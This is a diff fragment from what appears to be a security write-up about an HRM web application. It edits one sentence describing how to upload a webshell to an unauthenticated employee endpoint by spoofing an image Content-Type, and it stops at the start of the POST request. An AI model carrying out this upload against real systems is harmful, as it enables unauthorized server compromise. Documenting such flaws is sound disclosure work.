@@ -24,7 +24,7 @@ At `Add Employee` function, we discover an Profile Image upload button
 
 After analysis the source code, we know that `/hrm/controller/employee.php` allow an unauthorized user access and upload image file.
 
-Let's upload file webshell `leecybersec.php` with `Content-Type: image/jpg` without any unauthorization.
+Let's upload file webshell `leecybersec.php` with `Content-Type: image/jpg` without any authentication.
 
 ``` txt
 POST /hrm/controller/employee.php?empedit= HTTP/1.1
